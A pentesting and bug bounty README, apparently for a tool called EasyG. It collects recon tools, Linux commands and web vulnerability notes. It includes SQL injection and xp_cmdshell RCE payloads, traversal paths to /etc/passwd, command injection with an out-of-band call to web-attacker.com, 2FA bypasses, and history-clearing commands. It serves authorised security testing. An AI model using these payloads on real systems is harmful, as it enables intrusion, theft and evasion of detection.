```ruby
███████╗ █████╗ ███████╗██╗   ██╗ ██████╗
██╔════╝██╔══██╗██╔════╝╚██╗ ██╔╝██╔════╝
█████╗  ███████║███████╗ ╚████╔╝ ██║  ███╗
██╔══╝  ██╔══██║╚════██║  ╚██╔╝  ██║   ██║
███████╗██║  ██║███████║   ██║   ╚██████╔╝
╚══════╝╚═╝  ╚═╝╚══════╝   ╚═╝    ╚═════╝
Made with <3 by Riccardo Malatesta (@seeu)
```
[![License](https://img.shields.io/github/license/seeu-inspace/easyg)](https://github.com/seeu-inspace/easyg/blob/main/LICENSE)
[![Twitter](https://img.shields.io/twitter/follow/seeu_inspace?style=social)](https://twitter.com/intent/follow?screen_name=seeu_inspace)
[![Open Source Love](https://badges.frapsoft.com/os/v1/open-source.svg?v=103)](https://github.com/ellerbrock/open-source-badges/)

EasyG started out as a script that I use to automate some information gathering tasks for my hacking process, [you can find it here](https://github.com/seeu-inspace/easyg/blob/main/easyg.rb). Now it's more than that. Here I gather all the resources about PenTesting and Bug Bounty Hunting that I find interesting: notes, payloads, tools and more.

### <ins>Index</ins>

- [Blog / Writeups / News & more](#blog--writeups--news--more)
- [Safety tips](#safety-tips)
- [Check-lists](#check-lists)
- [Content Discovery](#content-discovery)
- [Tools](#tools)
  - [Burp Suite](#burp-suite)
- [Network](#network)
- [Linux](#linux)
- [Web vulnerabilities](#web-vulnerabilities)
  - [SQL Injection](#sql-injection)
  - [Authentication vulnerabilities](#authentication-vulnerabilities)
  - [Directory Traversal](#directory-traversal)
  - [OS Command Injection](#os-command-injection)
  - [Business logic vulnerabilities](#business-logic-vulnerabilities)
  - [Information Disclosure](#information-disclosure)
  - [Access control vulnerabilities and privilege escalation](#access-control-vulnerabilities-and-privilege-escalation)
  - [File upload vulnerabilities](#file-upload-vulnerabilities)
  - [Server-side request forgery (SSRF)](#server-side-request-forgery-ssrf)
  - [Open redirection](#open-redirection)
  - [XXE injection](#xxe-injection)
  - [Cross-site scripting (XSS)](#cross-site-scripting-xss)
  - [Cross-site request forgery (CSRF)](#cross-site-request-forgery-csrf)
  - [Cross-origin resource sharing (CORS)](#cross-origin-resource-sharing-cors)
  - [Clickjacking](#clickjacking)
  - [DOM-based vulnerabilities](#dom-based-vulnerabilities)
  - [WebSockets](#websockets)
  - [Insecure deserialization](#insecure-deserialization)
  - [Server-side template injection](#server-side-template-injection)
  - [Web cache poisoning](#web-cache-poisoning)
  - [HTTP Host header attacks](#http-host-header-attacks)
  - [HTTP request smuggling](#http-request-smuggling)
  - [OAuth authentication](#oauth-authentication)
  - [JWT Attacks](#jwt-attacks)
  - [Abusing S3 Bucket Permissions](#abusing-s3-bucket-permissions)
  - [Google Cloud Storage bucket](#google-cloud-storage-bucket)
  - [GraphQL](#graphql)
  - [WordPress](#wordpress)
  - [IIS - Internet Information Services](#iis---internet-information-services)
  - [Lotus Domino](#lotus-domino)
  - [Git source code exposure](#git-source-code-exposure)
  - [Subdomain takeover](#subdomain-takeover)
  - [4** Bypass](#4-bypass)
- [Thick client vulnerabilities](#thick-client-vulnerabilities)
  - [DLL Hijacking](#dll-hijacking)
  - [Insecure application design](#insecure-application-design)
  - [Weak Hashing Algorithms](#weak-hashing-algorithms)
  - [Cleartext secrets in memory](#cleartext-secrets-in-memory)
  - [Hardcoded secrets](#missing-code-obfuscation)
  - [Unsigned binaries](#unsigned-binaries)
  - [Lack of verification of the server certificate](#lack-of-verification-of-the-server-certificate)
  - [Insecure SSL/TLS configuration](#insecure-ssltls-configuration)
  - [Remote Code Execution via Citrix Escape](#remote-code-execution-via-citrix-escape)
  - [Direct database access](#direct-database-access)
  - [Insecure Windows Service permissions](#insecure-windows-service-permissions)
  - [Code injection](#code-injection)

<hr/>

### <ins>Blog / Writeups / News & more</ins>

- [PortSwigger/research](https://portswigger.net/research)
- [Skeleton Scribe (albinowax)](https://www.skeletonscribe.net)
- [CVE trends](https://cvetrends.com/)
- [Packet Storm](https://packetstormsecurity.com/)
- [Securibee](https://securib.ee/)
- [Sam Curry](https://samcurry.net/)
  - [Hacking Apple](https://samcurry.net/hacking-apple/)
- [Intigriti/xss-challenges/](https://blog.intigriti.com/hackademy/xss-challenges/)
- [HackerOne.com/hacktivity](https://hackerone.com/hacktivity)
- [List of bug-bounty writeups](https://pentester.land/list-of-bug-bounty-writeups.html)
- [Pentest reports](https://pentestreports.com/)
- [Public pentesting reports](https://github.com/juliocesarfort/public-pentesting-reports)
- [pentestbook.six2dez.com](https://pentestbook.six2dez.com/)
- [TheXcellerator](https://xcellerator.github.io/)
- [persistence-info.github.io](https://persistence-info.github.io/)
- [Facebook-BugBounty-Writeups](https://github.com/jaiswalakshansh/Facebook-BugBounty-Writeups)



### <ins>Safety tips</ins>

- For RCE 
  - Never upload a shell at first, you can be banned from a program. Just execute a `whoami` as a PoC, proceed with a shell if required/allowed.
- For stored XSS
  - `console.log()` is better than `alert()`, it makes less noise especially for stored XSS.
- For SQLi
  - Don't dump the entire db, you can be banned from a program. Just retrieve the db's name, version and/or other minor infos. Proceed with db dump only if required/allowed;
  - Don't use tautologies like `OR 1=1`, it can end up in a delete query or something dangerous. It's better to use `AND SLEEP(5)` or `te'+'st`.
- For subdomain takeovers
  - use as a PoC an html page like:<br/>
    9a69e2677c39cdae365b49beeac8e059.html
    ```HTML
    <!-- PoC by seeu -->
    ```



### <ins>Check-lists</ins>

- [Mobile Application Penetration Testing Cheatsheet](https://github.com/tanprathan/MobileApp-Pentest-Cheatsheet)
- [Mobile Hacking Cheatsheet](https://github.com/randorisec/MobileHackingCheatSheet)
- [SMB-Checklist](https://github.com/pentesterzone/pentest-checklists/blob/master/Services/SMB-Checklist.md)
- [Win32 Offensive Cheatsheet](https://github.com/matthieu-hackwitharts/Win32_Offensive_Cheatsheet)
- [Regexp Security Cheatsheet](https://github.com/attackercan/regexp-security-cheatsheet)
- [Cheat-Sheet - Active-Directory](https://github.com/drak3hft7/Cheat-Sheet---Active-Directory)
- [Security Testing of Thick Client Application](https://medium.com/@david.valles/security-testing-of-thick-client-application-15612f326cac)

#### Risk markers
- [ ] Copyright 1995
- [ ] Server: Apache 2.2
- [ ] Expider SSL Certificate
- [ ] "Internal" in hostname
- [ ] Shodan returns CVEs
- [ ] Nuclei template matches

#### Testing layers

- [ ] Integrations
- [ ] Application Libraries (usually JavaScript)
- [ ] Application: Custom Code or COTS
- [ ] Application Framework
- [ ] Web Hosting Software (Default creds, Web server misconfigurations, web exploits)
- [ ] Open Ports and Services (Default creds on services, service level exploits)

#### Bug bounty

Multiple targets
- [ ] Run EasyG assetenum + take screenshots or open results in firefox
- [ ] Select the interesting targets, see [Risk markers](#risk-markers)
- [ ] Check for mobile/desktop applications

Single target
- [ ] Recon
  + Explore the app
  + Use Crawl from EasyG and Burp, use Paramspider
  + See every functionality
  + Collect endpoints with [BurpJSLinkFinder](https://github.com/InitRoot/BurpJSLinkFinder)
  + Find more endpoints with Apkleak, Source2Url and see [Content Discovery](#content-discovery))
- [ ] Test Register
- [ ] Test Login: 2FA, Password reset, Open Redirect & co.
- [ ] [Upload Functions](#file-upload-vulnerabilities)
- [ ] Broken Access Control, IDOR & co
  - [IDOR Checklist](https://twitter.com/hunter0x7/status/1580211248037126145) 
- [ ] Content Types
  - Look for multipart-forms
  - Look for content type XML
  - Look for content type json
- [ ] APIs
  - Methods
  - [API Security Checklist](https://github.com/shieldfy/API-Security-Checklist)
- [ ] Account Section
  - Profile
    - Stored XSS 
  - App Custom Fields 
  - Integrations
    - SSRF, XSS
- [ ] Errors

#### OWASP
- [ ] [OWASP Testing Guide](https://owasp.org/www-project-web-security-testing-guide/)
- [ ] [OWASP Web Application Penetration Checklist](https://wiki.owasp.org/index.php/Testing_Checklist)
- [ ] [OWASP Mobile Application Security Testing Guide (MASTG)](https://github.com/OWASP/owasp-mastg)
- [ ] [OWASP Mobile Application Security Verification Standard (MASVS)](https://github.com/OWASP/owasp-masvs/)
- [ ] [OWASP MAS Checklist](https://github.com/OWASP/owasp-mastg/blob/443eb1260e18c4beb76f9c75b34ac8328e3327f2/docs/MAS_checklist.md)


### <ins>Content Discovery</ins>

**Some tips**
- If the application is ASP.NET, search for `Appsettings.json`
- Use recursion. If you encounter a `401` response, search with waybackmachine
- Search for past reports in the same program

**Check the tech of a target with**
- [Wappalyzer](https://www.wappalyzer.com/)
- [Webanalyze](https://github.com/rverton/webanalyze) Port of Wappalyzer for command line
  `./webanalyze -host example.com -crawl 1`
- [Shodan](https://chrome.google.com/webstore/detail/shodan/jjalcfnidlmpjhdfepjhjbhnhkbgleap)

**Tools**
- [feroxbuster](https://github.com/epi052/feroxbuster) `feroxbuster -u https://example.com/ --proxy http://127.0.0.1:8080 -k -w wordlist.txt -s 200,403`
- [dirsearch](https://github.com/maurosoria/dirsearch)
- [changedetection.io](https://github.com/dgtlmoon/changedetection.io)
- [ffuf](https://github.com/ffuf/ffuf)

**Wordlists**
- [SecLists](https://github.com/danielmiessler/SecLists)
- [wordlists.assetnote.io](https://wordlists.assetnote.io/)
- [content_discovery_all.txt](https://gist.github.com/jhaddix/b80ea67d85c13206125806f0828f4d10)
- [OneListForAll](https://github.com/six2dez/OneListForAll)
- [wordlistgen](https://github.com/ameenmaali/wordlistgen)
- [Scavenger](https://github.com/0xDexter0us/Scavenger)

**To find more endpoints**
- [Apkleak](https://github.com/dwisiswant0/apkleaks) to get endpoints from an apk
- [Source2Url](https://github.com/danielmiessler/Source2URL/blob/master/Source2URL) to get endpoints from a source code
- [waymore](https://github.com/xnl-h4ck3r/waymore) more results from the Wayback Machine
- [xnLinkFinder](https://github.com/xnl-h4ck3r/xnLinkFinder)
- [BurpJSLinkFinder](https://github.com/InitRoot/BurpJSLinkFinder)

**Google Dorking**
- `ext:` to search for: php, php3, aspx, asp, jsp, xhtml, phtml, html, xsp, nsf, form,swf;
- Search also for pdf, xlsx and similar, they may contain some infos;
- `site:` to target a website and its subdomains;
- `inurl:&` to search for parameters;
- `intitle:` to search interesting pages like admin, register, login etc.
- [Dorking on Steroids](https://hazanasec.github.io/2021-03-11-Dorking-on-Steriods/)
- `"Seeing something unexpected? Take a look at the GitHub profile guide." "COMPANY-TARGET" site:http://github.com` [[Reference](https://twitter.com/c3l3si4n/status/1580564006263173122)]
- [dorks_hunter](https://github.com/six2dez/dorks_hunter)

**GitHub Dorking**
- sensitive words: `password, api_key, access_key, dbpassword, dbuser, pwd, pwds, aws_access, key, token, credentials, pass, pwd, passwd, private, preprod, appsecret`
- languages: `json, bash, shell, java etc.`, example `HEROKU_API_KEY language:json`
- extensions: `extensions: bat, config, ini, env etc.`
- filename: `netrpc, .git-credentials, .history, .htpasswd, bash_history`
- [Other dorks](https://github.com/techgaun/github-dorks#list-of-dorks)
- [GitDorker](https://github.com/obheda12/GitDorker)



### <ins>Tools</ins>

**For a temporary public server**
- [XAMPP](https://www.apachefriends.org/) + [ngrok](https://ngrok.com/)
- [beeceptor](https://beeceptor.com/)

**For auths**
- [textverified.com](https://www.textverified.com/) for auths requiring a phone number
- [temp-mail.org](https://temp-mail.org/en/)
- To have multiple email adresses using gmail, you can add a `+` sign after your email's alias. For example: if your email is `janedoe@gmail.com` and you sign up for Twitter you can sign up using `janedoe+twitter@gmail.com`. [[Reference](https://twitter.com/_thegameoflife_/status/1564642697482231813)]

**To find parameters**
- [Arjun](https://github.com/s0md3v/Arjun) detection of the parameters present in the application
- [ParamSpider](https://github.com/devanshbatham/ParamSpider)

**Asset enumeration/discovery**
- [nmap](https://nmap.org/)
  - Discover everything + services `nmap -p 1-65535 -sV -T4 -Pn -n -vv -iL target.txt -oX out.xml` 
- [bgp.he.net](https://bgp.he.net/) to find ASN + `amass intel -asn <ASN>`
- [crt.sh](https://crt.sh/)
  - [Crtsh-Fetcher](https://github.com/m0pam/crtsh-fetcher)
  - To find new domains ` cat json.txt | jq -r '.[].common_name' | sed 's/\*//g' | sort -u | rev | cut -d "." -f 1,2 | rev | sort -u | tee out.txt`
- [naabu](https://github.com/projectdiscovery/naabu)
  - Discover everything faster `naabu -l 1.txt -v -p - -exclude-ports 80,443,81,3000,3001,8000,8080,8443 -c 1000 -rate 7000 -stats -o 1_o.txt` 
- [gobuster](https://github.com/OJ/gobuster) + [all.txt by jhaddix](https://gist.github.com/jhaddix/86a06c5dc309d08580a018c66354a056)
  - you can use [gb.rb](https://github.com/seeu-inspace/easyg/blob/main/scripts/gb.rb)
- [dnsx](https://github.com/projectdiscovery/dnsx)
  - Reverse DNS lookup `cat ip.txt | dnsx -ptr -resp-only` 
- [VhostScan](https://github.com/codingo/VHostScan) to discover virtual hosts
- [gip](https://github.com/dalance/gip) a command-line tool and Rust library to check global IP address.

**For ulnerabilities**
- [BruteSpray](https://github.com/x90skysn3k/brutespray) `python brutespray.py --file nmap.xml --threads 5 --hosts 5`
- [SearchSploit](https://github.com/offensive-security/exploitdb#searchsploit) Port services vulnerability checks
- [CMSeeK](https://github.com/Tuhinshubhra/CMSeeK) CMS Detection & Exploitation Suite
- [nuclei](https://github.com/projectdiscovery/nuclei)
  - Automatic Selection `nuclei -u http://target.io -as` 
  - Check for Exposed panels `%USERPROFILE%\nuclei-templates\exposed-panels`
  - Check for Technologies `%USERPROFILE%\nuclei-templates\technologies`
  - Check for more `-t %USERPROFILE%\nuclei-templates\misconfiguration -t %USERPROFILE%\nuclei-templates\cves -t %USERPROFILE%\nuclei-templates\cnvd`
  - Use it in a workflow `cat subdomains.txt | httpx | nuclei -t technologies`
  - [nuclei geeknik](https://github.com/geeknik/the-nuclei-templates)

**Decompilers**
- [Java Decompiler](https://java-decompiler.github.io/)
- [dex2jar](https://github.com/pxb1988/dex2jar) decompile an .apk into .jar
- [jadx-gui](https://github.com/skylot/jadx/releases) another tool for producing Java source code from Android Dex and Apk files
- [apktool](https://ibotpeaches.github.io/Apktool/) to unpack an apk

**Android**
- [m.apkpure.com](https://m.apkpure.com/it/) Download APKs
- [apps.evozi.com](https://apps.evozi.com/apk-downloader/) Download APKs
- [apk-dl.com](http://apk-dl.com/) Download APKs
- [adb](https://developer.android.com/studio/command-line/adb) it is used to debug an android device
- [HTTP Toolkit](https://httptoolkit.tech/) to see requests on a non-rooted or emulated device
- [Genymotion](https://www.genymotion.com/) an android emulator
- [Android Studio](https://developer.android.com/studio) Android application development, useful also for the emulator
  - Note: to start only the emulator, use commands such as
    ```cmd
    cd C:\Users\Riccardo\AppData\Local\Android\Sdk\emulator
    emulator -avd Pixel_4_XL_API_30
    ```

**For Reporting**
- [Vulnerability Rating Taxonomy](https://bugcrowd.com/vulnerability-rating-taxonomy)
- [CVSS Calculator](https://www.first.org/cvss/calculator/3.1)
- [PwnDoc](https://github.com/pwndoc/pwndoc)
- [Vulnrepo](https://vulnrepo.com/home)
- [PlexTrac](https://plextrac.com/)

**Other**
- [URL Decoder/Encoder](https://meyerweb.com/eric/tools/dencoder/)
- [base64encode.org](https://www.base64encode.org/)
- [Down or not](https://www.websiteplanet.com/webtools/down-or-not/)
- [DigitalOcean](https://www.digitalocean.com/) See [Setting Up Your Ubuntu Box for Pentest and Bug Bounty Automation](https://www.youtube.com/watch?v=YhUiAH5SIqk)
- [trashcompactor](https://github.com/michael1026/trashcompactor) to remove URLs with duplicate funcionality based on script resources included
- [jdam - Structure-aware JSON fuzzing](https://gitlab.com/michenriksen/jdam)
- [Visual Studio Code](https://code.visualstudio.com/) for Source Code Analysis
- [beautifier.io](https://beautifier.io/) for JavaScript Analysis

**Used in [easyg.rb](https://github.com/seeu-inspace/easyg/blob/main/easyg.rb)**
- [amass](https://github.com/OWASP/Amass)
- [subfinder](https://github.com/projectdiscovery/subfinder)
- [github-subdomains](https://github.com/gwen001/github-subdomains)
- [crt.sh](https://crt.sh/)
- [httprobe](https://github.com/tomnomnom/httprobe)
  - `type subs.txt | httprobe -p http:81 -p http:3000 -p https:3000 -p http:3001 -p https:3001 -p http:8000 -p http:8080 -p https:8443 -c 150 > out.txt`
- [anew](https://github.com/tomnomnom/anew)
- [naabu](https://github.com/projectdiscovery/naabu)
  - `naabu -v -list subs.txt -exclude-ports 80,443,81,3000,3001,8000,8080,8443 -stats -o out.txt`
- [gospider](https://github.com/jaeles-project/gospider)
- [hakrawler](https://github.com/hakluke/hakrawler)
- [Selenium](https://github.com/SeleniumHQ/selenium/wiki/Ruby-Bindings)
- [nuclei](https://github.com/projectdiscovery/nuclei)
  - `nuclei -l httprobe_results.txt  -t %USERPROFILE%/nuclei-templates/takeovers -t %USERPROFILE%/nuclei-templates/exposures/configs/git-config.yaml -t %USERPROFILE%/nuclei-templates/vulnerabilities/generic/crlf-injection.yaml -t %USERPROFILE%/nuclei-templates/exposures/apis/swagger-api.yaml -o out.txt`
  - `nuclei -l list.txt -as -tags log4j -o output.txt`

#### <ins>Burp suite</ins>

To add a domain + subdomains in advanced scopes: `^(.*\.)?test\.com$`

To add a new header
```
1. Go to Proxy -> Options -> Match and Replace -> Add
2. Change Type to Request Header
3. As the default text says in Match 'leave blank to add a new header'
4. Put the new header in Replace
```

Cool extensions:
- [Turbo Intruder](https://github.com/PortSwigger/turbo-intruder)
- [HTTP Request Smuggler](https://github.com/PortSwigger/http-request-smuggler)
- [Wsdler](https://github.com/NetSPI/Wsdler) to interact with SOAP
- [InQL](https://portswigger.net/bappstore/296e9a0730384be4b2fffef7b4e19b1f)
- [Swagger-EZ](https://github.com/RhinoSecurityLabs/Swagger-EZ)
- [BurpCustomizer](https://github.com/CoreyD97/BurpCustomizer)
- [Software Version Reporter](https://portswigger.net/bappstore/ae62baff8fa24150991bad5eaf6d4d38)
- [Software Vulnerability Scanner](https://portswigger.net/bappstore/c9fb79369b56407792a7104e3c4352fb)
- [IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
- [Autorize](https://github.com/PortSwigger/autorize)
- [Active Scan++](https://portswigger.net/bappstore/3123d5b5f25c4128894d97ea1acc4976)
- [BurpJSLinkFinder](https://github.com/PortSwigger/js-link-finder)
- [Anonymous Cloud](https://portswigger.net/bappstore/ea60f107b25d44ddb59c1aee3786c6a1)
- [AWS Security Checks](https://portswigger.net/bappstore/f078b9254eab40dc8c562177de3d3b2d)
- [Upload Scanner](https://portswigger.net/bappstore/b2244cbb6953442cb3c82fa0a0d908fa)
- [Taborator](https://portswigger.net/bappstore/c9c37e424a744aa08866652f63ee9e0f)
- [AutoRepeater](https://github.com/nccgroup/AutoRepeater)
- [JWT Editor](https://portswigger.net/bappstore/26aaa5ded2f74beea19e2ed8345a93dd)



### <ins>Network</ins>
```
ip route add <net_address_in_cdr> via <interface_gateway>
route add <net_address_in_cdr> mask <net_address_mask_in_cdr> <interface_gateway> (Windows)
nmap -sn <net_address_in_cdr> | Check hosts alive, adding -A you gather more info for a target
```

**Resources**
- [Echo Mirage](https://resources.infosecinstitute.com/topic/echo-mirage-walkthrough/)
- [Wireshark](https://www.wireshark.org/)
- [PCredz](https://github.com/lgandx/PCredz)
- [Impacket](https://github.com/SecureAuthCorp/impacket)
- [putty](https://www.putty.org/)

### <ins>Linux</ins>

**Linux Commands**
```
netstat -tulpn                                        Show Linux network ports with process ID’s (PIDs)
watch ss -stplu                                       Watch TCP, UDP open ports in real time with socket summary.
lsof -i                                               Show established connections.
macchanger -m MACADDR INTR                            Change MAC address on KALI Linux.
ifconfig eth0 192.168.2.1/24                          Set IP address in Linux.
ifconfig eth0:1 192.168.2.3/24                        Add IP address to existing network interface in Linux.
ifconfig eth0 hw ether MACADDR                        Change MAC address in Linux using ifconfig.
ifconfig eth0 mtu 1500                                Change MTU size Linux using ifconfig, change 1500 to your desired MTU.
dig -x 192.168.1.1                                    Dig reverse lookup on an IP address.
host 192.168.1.1                                      Reverse lookup on an IP address, in case dig is not installed.
dig @192.168.2.2 domain.com -t AXFR                   Perform a DNS zone transfer using dig.
host -l domain.com nameserver                         Perform a DNS zone transfer using host.
nbtstat -A x.x.x.x                                    Get hostname for IP address.
ip addr add 192.168.2.22/24 dev eth0                  Adds a hidden IP address to Linux, does not show up when performing an ifconfig.
tcpkill -9 host google.com                            Blocks access to google.com from the host machine.
echo \"1\" > /proc/sys/net/ipv4/ip_forward              Enables IP forwarding, turns Linux box into a router – handy for routing traffic through a box.
echo \"8.8.8.8\" > /etc/resolv.conf                     Use Google DNS.  
```

**Linux User Management**
```
whoami                                                Shows currently logged in user on Linux.
id                                                    Shows currently logged in user and groups for the user.
last                                                  Shows last logged in users.
mount                                                 Show mounted drives.
df -h                                                 Shows disk usage in human readable output.
echo \"user:passwd\" | chpasswd                         Reset password in one line.
getent passwd                                         List users on Linux.
strings /usr/local/bin/blah                           Shows contents of none text files, e.g. whats in a binary.
uname -ar                                             Shows running kernel version.
PATH=$PATH:/my/new-path                               Add a new PATH, handy for local FS manipulation.
history                                               Show bash history, commands the user has entered previously.
```

**Linux File Commands**
```
df -h blah                                            Display size of file / dir Linux.
diff file1 file2                                      Compare / Show differences between two files on Linux.
md5sum file                                           Generate MD5SUM Linux.
md5sum -c blah.iso.md5                                Check file against MD5SUM on Linux, assuming both file and .md5 are in the same dir.
file blah                                             Find out the type of file on Linux, also displays if file is 32 or 64 bit.
dos2unix                                              Convert Windows line endings to Unix / Linux.
base64 < input-file > output-file                     Base64 encodes input file and outputs a Base64 encoded file called output-file.
base64 -d < input-file > output-file                  Base64 decodes input file and outputs a Base64 decoded file called output-file.
touch -r ref-file new-file                            Creates a new file using the timestamp data from the reference file, drop the -r to simply create a file.
rm -rf                                                Remove files and directories without prompting for confirmation.
```

**Misc Commands**
```
init 6                                                Reboot Linux from the command line.
gcc -o output.c input.c                               Compile C code.
gcc -m32 -o output.c input.c                          Cross compile C code, compile 32 bit binary on 64 bit Linux.
unset HISTORYFILE                                     Disable bash history logging.
rdesktop X.X.X.X                                      Connect to RDP server from Linux.
kill -9 $$                                            Kill current session.
chown user:group blah                                 Change owner of file or dir.
chown -R user:group blah                              Change owner of file or dir and all underlying files / dirs – recersive chown.
chmod 600 file                                        Change file / dir permissions, see [Linux File System Permissons](#linux-file-system-permissions) for details.
ssh user@X.X.X.X | cat /dev/null > ~/.bash_history    Clear bash history
```

**Linux File System Permissions**
```
777 rwxrwxrwx                                         No restriction, global WRX any user can do anything.
755 rwxr-xr-x                                         Owner has full access, others can read and execute the file.
700 rwx------                                         Owner has full access, no one else has access.
666 rw-rw-rw-                                         All users can read and write but not execute.
644 rw-r--r--                                         Owner can read and write, everyone else can read.
600 rw-------                                         Owner can read and write, everyone else has no access.
```

**Linux Directories**
```
/                                                     / also know as “slash” or the root.
/bin                                                  Common programs, shared by the system, the system administrator and the users.
/boot                                                 Boot files, boot loader (grub), kernels, vmlinuz
/dev                                                  Contains references to system devices, files with special properties.
/etc                                                  Important system config files.
/home                                                 Home directories for system users.
/lib                                                  Library files, includes files for all kinds of programs needed by the system and the users.
/lost+found                                           Files that were saved during failures are here.
/mnt                                                  Standard mount point for external file systems.
/media                                                Mount point for external file systems (on some distros).
/net                                                  Standard mount point for entire remote file systems – nfs.
/opt                                                  Typically contains extra and third party software.
/proc                                                 A virtual file system containing information about system resources.
/root                                                 root users home dir.
/sbin                                                 Programs for use by the system and the system administrator.
/tmp                                                  Temporary space for use by the system, cleaned upon reboot.
/usr                                                  Programs, libraries, documentation etc. for all user-related programs.
/var                                                  Storage for all variable files and temporary files created by users, such as log files, mail queue,
                                                      print spooler. Web servers, Databases etc.
```

**Linux Interesting Files / Directories**
```
/etc/passwd                                           Contains local Linux users.
/etc/shadow                                           Contains local account password hashes.
/etc/group                                            Contains local account groups.
/etc/init.d/                                          Contains service init script – worth a look to see whats installed.
/etc/hostname                                         System hostname.
/etc/network/interfaces                               Network interfaces.
/etc/resolv.conf                                      System DNS servers.
/etc/profile                                          System environment variables.
~/.ssh/                                               SSH keys.
~/.bash_history                                       Users bash history log.
/var/log/                                             Linux system log files are typically stored here.
/var/adm/                                             UNIX system log files are typically stored here.
/var/log/apache2/access.log                           Apache access log file typical path.
/var/log/httpd/access.log                             Apache access log file typical path.
/etc/fstab                                            File system mounts.
```



## Web vulnerabilities



### <ins>SQL injection</ins>

**Tools**
- [SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
- [sqlmap](https://sqlmap.org/)

```
 > SQLMap: sqlmap -u https://vulnerable/index.php?id=1
                  --tables (to see db)
                  -D DATABASE_NAME -T TABLE_NAME --dump (to see data)
                  --forms --batch --crawl=10 --random-agent --level=5 --risk=3 (to crawl)
```

**Some payloads**
- ```SQL
  0'XOR(if(now()=sysdate(),sleep(10),0))XOR'Z
  ```
- ```SQL
  0'|(IF((now())LIKE(sysdate()),SLEEP(1),0))|'Z
  ```
- ```SQL
  0'or(now()=sysdate()&&SLEEP(1))or'Z
  ```

**RCE**
```sql
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
xp_cmdshell 'COMMAND';
```

```
EXEC sp_configure 'allow updates', 0
RECONFIGURE
EXEC sp_configure 'show advanced options', 1
GO
RECONFIGURE
GO
EXEC sp_configure 'xp_cmdshell', 1
GO
RECONFIGURE
GO
xp_cmdshell 'COMMAND';
```



### <ins>Authentication vulnerabilities</ins>

- Multi-factor authentication
  - Response manipulation, try to intercept the response and modify the status to `200`
  - Status code manipulation, change the code from `4xx` to `200`
  - 2FA code leakage in the response
  - JS File Analysis
  - 2FA Code Reusability
  - Lack of Bruteforce protection
  - The 2FA code can be used for any user
  - CSRF on 2FA disabling
  - Password reset disable 2FA
  - Bypass 2FA with null or `000000`
  - Access the content directly
  - Login with Oauth to bypass 2FA
  - If you get logged-out after failed attempts, use macros with Burp
- Password reset
  - Change the `Host` with the host of your server. The request for a password reset might use the `Host` value for the link with the reset token
  - Try with headers like `X-Forwarded-Host:`
  - Via dangling markup
    - `Host: victim.com:'<a href="//attacker.com/?`
  - Insert two emails, like:
    - `email1@service.com;email2@service.com`
    - `email:["email1@service.com","email2@service.com"]`
- [Password change](https://portswigger.net/web-security/authentication/other-mechanisms/lab-password-brute-force-via-password-change)
- [Keeping users logged in](https://portswigger.net/web-security/authentication/other-mechanisms/lab-brute-forcing-a-stay-logged-in-cookie)
- Rate-limit
  - Bypass with `X-Forwarded-For:127.0.0.1-1000`
  - IP rotating, you can use
    - [mubeng](https://github.com/kitabisa/mubeng)
    - [Burp extension: IP Rotate](https://portswigger.net/bappstore/2eb2b1cb1cf34cc79cda36f0f9019874)
  - Log in into a valid account to reset the rate-limit
- Test remember me functionality
- Web Cache Deception
  - Attacker send to a victim a 404 endpoint like `site.com/dir/ok.css`
  - Victim click on it, the CDN cache the page
  - Attacker goes to `site.com/dir/ok.css`, now it can see the page of the Victim
- PHP protections can be bypassed with `[]`, like `password=123` to `password[]=123`
- Replace password with a list of candidates, example
  ```
  "username":"usertest"
  "password":[
   "123456",
   "password",
   "qwerty",
   ...
  ``` 


### <ins>Directory Traversal</ins>

- simple case `https://insecure-website.com/loadImage?filename=..\..\..\windows\win.ini`
- absolute path `https://insecure-website.com/loadImage?filename=/etc/passwd`
- stripped non-recursively `https://insecure-website.com/loadImage?filename=....//....//....//etc/passwd`
- superfluous URL-decode `https://insecure-website.com/loadImage?filename=..%252f..%252f..%252fetc/passwd`
- validation of start of path `https://insecure-website.com/loadImage?filename=/var/www/images/../../../etc/passwd`
- validation of start of path `https://insecure-website.com/loadImage?filename=../../../etc/passwd%00.png`



### <ins>OS Command Injection</ins>

Let's say that the vulnerable endpoint it's `https://insecure-website.com/stockStatus?productID=381&storeID=29`. The provide the stock information, the application runs the command `stockpile.pl 381 29`. If there is no OS Command Injection protection, by inserting the payload `& echo abcdefg &` in `productID` it's possible to execute the command `echo`.

For blind OS Command Injections
- Time delay `& ping -c 10 127.0.0.1 &`
- Redirecting output `& whoami > /var/www/static/whoami.txt &`
- Out-of-band (OAST) techniques `& nslookup kgji2ohoyw.web-attacker.com &`

Ways of injecting OS commands
- Both Windows and Unix-based systems
  - `&`
  - `&&`
  - `|`
  - `||`
- Unix-based systems only
  - `;`
  - Newline with `0x0a` or `\n`
  - `injected command`
  - `$(injected command)`

**Resource**
- [commix-testbed](https://github.com/commixproject/commix-testbed)




### <ins>Business logic vulnerabilities</ins>

**Examples**
- Excessive trust in client-side controls
- 2FA broken logic
- Failing to handle unconventional input
- Inconsistent security controls
- Weak isolation on dual-use endpoint
- Password reset broken logic
- Insufficient workflow validation
- Flawed enforcement of business rules
- [Authentication bypass via encryption oracle](https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-authentication-bypass-via-encryption-oracle)



### <ins>Information Disclosure</ins>

What is information disclosure?
- Data about other users, such as usernames or financial information
- Sensitive commercial or business data
- Technical details about the website and its infrastructure

What are some examples of information disclosure?
- Revealing the names of hidden directories, their structure, and their contents via a robots.txt file or directory listing
- Providing access to source code files via temporary backups
- Explicitly mentioning database table or column names in error messages
- Unnecessarily exposing highly sensitive information, such as credit card details
- Hard-coding API keys, IP addresses, database credentials, and so on in the source code
- Hinting at the existence or absence of resources, usernames, and so on via subtle differences in application behavior
- If you need to find UUID from an email, try to register the user and see if in the response it's disclosed. [[Reference](https://twitter.com/intigriti/status/1217794181982302208)]

How do information disclosure vulnerabilities arise?
- Failure to remove internal content from public content
- Insecure configuration of the website and related technologies
- Flawed design and behavior of the application



### <ins>Access control vulnerabilities and privilege escalation</ins>

In the context of web applications, access control is dependent on authentication and session management:
- Authentication identifies the user and confirms that they are who they say they are;
- Session management identifies which subsequent HTTP requests are being made by that same user;
- Access control determines whether the user is allowed to carry out the action that they are attempting to perform.

From a user perspective, access controls can be divided into the following categories:
- Vertical access controls
  Mechanisms that restrict access to sensitive functionality that is not available to other types of users
- Horizontal access controls
